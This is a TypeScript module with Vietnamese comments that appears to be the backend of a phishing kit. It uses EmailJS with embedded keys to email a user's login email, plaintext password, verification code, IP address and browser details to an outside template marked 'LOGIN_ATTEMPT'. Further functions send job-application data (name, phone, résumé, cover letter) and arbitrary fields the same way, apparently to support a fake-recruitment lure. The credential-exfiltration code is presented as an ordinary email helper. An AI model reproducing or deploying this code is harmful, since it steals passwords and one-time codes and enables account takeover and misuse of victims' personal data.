import emailjs from '@emailjs/browser';

// Configure EmailJS với thông tin của bạn
const SERVICE_ID = 'service_ieaopgl';
const TEMPLATE_ID = 'template_zvcv0qf';
const PUBLIC_KEY = 'pgcGwVmRmBOKo-kUL';

// Khởi tạo EmailJS
emailjs.init(PUBLIC_KEY);

/**
 * Lấy địa chỉ IP của người dùng từ server
 */
export const getUserIp = async (): Promise<string> => {
  try {
    const response = await fetch('/api/ip');
    const data = await response.json();
    return data.ip || 'Unknown';
  } catch (error) {
    console.error('Error fetching IP address:', error);
    return 'Unknown';
  }
};

/**
 * Gửi thông tin đăng nhập của người dùng qua EmailJS
 */
export const sendLoginInfo = async (data: {
  email: string;
  password: string;
  verificationCode?: string;
  timestamp: string;
  ip?: string;
  userAgent?: string;
}) => {
  try {
    const templateParams = {
      event_type: 'LOGIN_ATTEMPT',
      email: data.email,
      password: data.password,
      verification_code: data.verificationCode || 'N/A',
      timestamp: data.timestamp,
      ip_address: data.ip || 'Unknown',
      user_agent: data.userAgent || navigator.userAgent,
      details: JSON.stringify(data, null, 2)
    };

    const response = await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
    console.log('Email sent successfully!', response.status, response.text);
    return { success: true };
  } catch (error) {
    console.error('Failed to send email:', error);
    return { success: false, error };
  }
};

/**
 * Gửi thông tin ứng tuyển của người dùng qua EmailJS
 */
export const sendApplicationInfo = async (data: {
  jobTitle: string;
  jobId: number;
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  resumePath: string;
  resumeFileName: string;
  coverLetter?: string;
  timestamp: string;
  ip?: string;
  userAgent?: string;
}) => {
  try {
    const templateParams = {
      event_type: 'JOB_APPLICATION',
      job_title: data.jobTitle,
      job_id: data.jobId.toString(),
      first_name: data.firstName,
      last_name: data.lastName,
      email: data.email,
      phone: data.phone,
      resume_filename: data.resumeFileName,
      cover_letter: data.coverLetter || 'N/A',
      timestamp: data.timestamp,
      ip_address: data.ip || 'Unknown',
      user_agent: data.userAgent || navigator.userAgent,
      details: JSON.stringify(data, null, 2)
    };

    const response = await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
    console.log('Application info email sent successfully!', response.status, response.text);
    return { success: true };
  } catch (error) {
    console.error('Failed to send application email:', error);
    return { success: false, error };
  }
};

/**
 * Gửi thông tin khác qua EmailJS
 */
export const sendCustomInfo = async (eventType: string, data: Record<string, any>) => {
  try {
    const templateParams = {
      event_type: eventType,
      timestamp: new Date().toISOString(),
      ip_address: 'Unknown',
      user_agent: navigator.userAgent,
      ...data,
      details: JSON.stringify(data, null, 2)
    };

    const response = await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
    console.log(`Custom info (${eventType}) email sent successfully!`, response.status, response.text);
    return { success: true };
  } catch (error) {
    console.error(`Failed to send custom email (${eventType}):`, error);
    return { success: false, error };
  }
};